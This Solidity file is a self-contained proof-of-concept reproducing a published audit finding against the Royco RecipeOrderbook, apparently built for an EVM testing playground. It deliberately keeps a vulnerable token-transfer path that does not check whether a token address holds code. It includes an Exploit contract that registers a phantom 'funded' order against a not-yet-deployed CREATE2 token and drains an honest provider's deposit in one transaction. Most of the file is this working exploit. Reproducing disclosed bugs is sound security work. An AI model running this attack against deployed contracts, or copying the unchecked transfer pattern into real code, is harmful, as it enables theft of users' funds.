// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*//////////////////////////////////////////////////////////////////////////
    Royco RecipeOrderbook — "Successful transfers on non-existent tokens allow
    attackers to steal reward tokens" (Cantina, Aug 2024; finding #46673)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. Solmate's
    SafeTransferLib assembly and the two blamed RecipeOrderbook call sites are
    inlined VERBATIM; a CREATE2 factory (from the finding's PoC) predicts the
    reward-token address before deployment. The Exploit (attacker) and a separate
    Provider (honest incentive provider / victim) run the whole attack in one tx.

    Bug: Solmate SafeTransferLib succeeds on a token address with NO code (a CALL
    to a codeless address returns success with empty returndata, and the library
    treats iszero(returndatasize()) as success). RecipeOrderbook.createIPOrder
    pulls the offered reward tokens through it with no code-existence check, so an
    attacker registers a fully "funded" order against a not-yet-deployed token,
    depositing nothing. When a genuine provider later funds a real order in the
    (now deployed, commingled) token, the attacker fills their phantom order and
    drains the genuine deposit.
//////////////////////////////////////////////////////////////////////////*/

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        return true;
    }

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        unchecked {
            balanceOf[to] += amount;
        }
    }
}

contract MockERC20 is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}
}

/// @dev Solmate SafeTransferLib — VERBATIM assembly. "none of the functions in
///      this library check that a token has code at all!"
library SafeTransferLib {
    function safeTransferFrom(ERC20 token, address from, address to, uint256 amount) internal {
        bool success;

        /// @solidity memory-safe-assembly
        assembly {
            let freeMemoryPointer := mload(0x40)
            mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemoryPointer, 4), and(from, 0xffffffffffffffffffffffffffffffffffffffff))
            mstore(add(freeMemoryPointer, 36), and(to, 0xffffffffffffffffffffffffffffffffffffffff))
            mstore(add(freeMemoryPointer, 68), amount)

            success := and(
                // returned exactly 1 (can't just be non-zero data), or had NO return data.
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)
            )
        }

        require(success, "TRANSFER_FROM_FAILED");
    }

    function safeTransfer(ERC20 token, address to, uint256 amount) internal {
        bool success;

        /// @solidity memory-safe-assembly
        assembly {
            let freeMemoryPointer := mload(0x40)
            mstore(freeMemoryPointer, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff))
            mstore(add(freeMemoryPointer, 36), amount)

            success := and(
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
            )
        }

        require(success, "TRANSFER_FAILED");
    }
}

/// @dev Minimal faithful reduction of Royco RecipeOrderbook (two blamed call sites).
contract RecipeOrderbook {
    using SafeTransferLib for ERC20;

    enum RewardStyle {
        Upfront,
        Arrear,
        Forfeitable
    }

    struct Recipe {
        bytes32[] weirollCommands;
        bytes[] weirollState;
    }

    struct Market {
        address inputToken;
        uint256 lockupTime;
        uint256 frontendFee;
        RewardStyle rewardStyle;
    }

    struct IPOrder {
        uint256 targetMarketID;
        address ip;
        uint256 quantity;
        address[] tokensOffered;
        uint256[] amountsOffered;
    }

    uint256 public numMarkets;
    uint256 public numOrders;
    mapping(uint256 => Market) public marketIDToMarket;
    mapping(uint256 => IPOrder) internal orderIDToIPOrder;

    function createMarket(
        address inputToken,
        uint256 lockupTime,
        uint256 frontendFee,
        Recipe memory,
        Recipe memory,
        RewardStyle rewardStyle
    ) external returns (uint256 marketID) {
        marketID = numMarkets++;
        marketIDToMarket[marketID] = Market(inputToken, lockupTime, frontendFee, rewardStyle);
    }

    function createIPOrder(
        uint256 targetMarketID,
        uint256 quantity,
        uint256,
        address[] memory tokensOffered,
        uint256[] memory tokenAmounts
    ) external returns (uint256 orderID) {
        orderID = numOrders++;
        IPOrder storage order = orderIDToIPOrder[orderID];
        order.targetMarketID = targetMarketID;
        order.ip = msg.sender;
        order.quantity = quantity;
        order.tokensOffered = tokensOffered;
        order.amountsOffered = tokenAmounts;

        // RecipeOrderbook.sol#L383 — pull the offered incentive tokens from the IP.
        // @> No check that `tokensOffered[i]` has code. SafeTransferLib silently
        // @> succeeds on a codeless address, so an attacker records a fully "funded"
        // @> order against a not-yet-deployed token while depositing NOTHING.
        for (uint256 i = 0; i < tokensOffered.length; ++i) {
            ERC20(tokensOffered[i]).safeTransferFrom(msg.sender, address(this), tokenAmounts[i]);
        }
    }

    function fillIPOrder(uint256 orderID, uint256 fillAmount, address, address) external {
        IPOrder storage order = orderIDToIPOrder[orderID];
        Market storage market = marketIDToMarket[order.targetMarketID];

        ERC20(market.inputToken).safeTransferFrom(msg.sender, address(this), fillAmount);

        uint256 fillPercentage = (fillAmount * 1e18) / order.quantity;

        // RecipeOrderbook.sol#L534 — pay the recorded incentive out to the LP (attacker).
        // The reward-token balance is commingled, so this pays the attacker's phantom
        // order out of the genuine IP's real deposit.
        for (uint256 i = 0; i < order.tokensOffered.length; ++i) {
            uint256 amount = (order.amountsOffered[i] * fillPercentage) / 1e18;
            uint256 frontendFeeAmount = (amount * market.frontendFee) / 1e18;
            uint256 incentiveAmount = amount - frontendFeeAmount;
            ERC20(order.tokensOffered[i]).safeTransfer(msg.sender, incentiveAmount);
        }
    }
}

/// @dev CREATE2 factory: reward token's address is known BEFORE it exists (from the finding's PoC).
contract DeterminsticTokenFactory {
    function deploy(uint256 _salt) public payable returns (address) {
        return address(new MockERC20{ salt: bytes32(_salt) }("Name", "Symbol"));
    }

    function getBytecode() public pure returns (bytes memory) {
        bytes memory bytecode = type(MockERC20).creationCode;
        return abi.encodePacked(bytecode, abi.encode("Name", "Symbol"));
    }

    function getAddress(uint256 _salt) public view returns (address) {
        bytes32 hash =
            keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(getBytecode())));
        return address(uint160(uint256(hash)));
    }
}

/// @dev The honest incentive provider (victim): funds a REAL order in the deployed reward token.
contract Provider {
    function fundRealOrder(MockERC20 reward, RecipeOrderbook ob, uint256 marketId, uint256 amount) external {
        reward.mint(address(this), amount);
        reward.approve(address(ob), amount);
        address[] memory toks = new address[](1);
        toks[0] = address(reward);
        uint256[] memory amts = new uint256[](1);
        amts[0] = amount;
        ob.createIPOrder(marketId, amount, block.timestamp + 1 days, toks, amts);
    }
}

/// @dev The attacker. Registers a phantom order against a not-yet-deployed token, lets a genuine
///      provider fund a real order, then fills the phantom order and drains it (one tx, no cheats).
contract Exploit {
    uint256 public constant SALT = 1;
    uint256 public constant AMOUNT = 100 ether;

    RecipeOrderbook public ob;
    MockERC20 public lp;
    DeterminsticTokenFactory public factory;
    Provider public provider;
    address public attacker;
    MockERC20 public reward;

    constructor() {
        attacker = msg.sender;
        ob = new RecipeOrderbook();
        lp = new MockERC20("LP", "LP");
        factory = new DeterminsticTokenFactory();
        provider = new Provider();
    }

    function _empty() internal pure returns (RecipeOrderbook.Recipe memory) {
        return RecipeOrderbook.Recipe(new bytes32[](0), new bytes[](0));
    }

    function run() external {
        // The reward token's address is known ahead of time but has NO code yet.
        address rewardAddr = factory.getAddress(SALT);
        require(rewardAddr.code.length == 0, "reward should not exist yet");

        // 1. Attacker creates a market and a "funded" IP order against the codeless token.
        ob.createMarket(address(lp), 1 days, 0.002e18, _empty(), _empty(), RecipeOrderbook.RewardStyle.Upfront);
        address[] memory toks = new address[](1);
        toks[0] = rewardAddr;
        uint256[] memory amts = new uint256[](1);
        amts[0] = AMOUNT;
        uint256 attackerOrderId = ob.createIPOrder(0, 1, block.timestamp + 1 days, toks, amts); // pulls 0

        // 2. The reward token is actually deployed at the predicted address.
        reward = MockERC20(factory.deploy(SALT));
        require(rewardAddr.code.length > 0, "reward now exists");

        // 3. A genuine provider funds a REAL order with 100e18 of the reward token.
        provider.fundRealOrder(reward, ob, 0, AMOUNT);
        require(reward.balanceOf(address(ob)) == AMOUNT, "only genuine IP funded 100e18");

        // 4. Attacker fills their OWN phantom order and drains the genuine provider's deposit.
        lp.mint(address(this), 1);
        lp.approve(address(ob), 1);
        ob.fillIPOrder(attackerOrderId, 1, address(0), address(0xdead));

        // HARM: the attacker — who deposited ZERO reward tokens — walks away with the
        // genuine provider's funds (100e18 minus the 0.2e18 frontend fee).
        require(reward.balanceOf(address(this)) == 99.8 ether, "attacker did not drain deposit");
        require(reward.balanceOf(address(ob)) == 0.2 ether, "orderbook not drained to fee");
    }
}
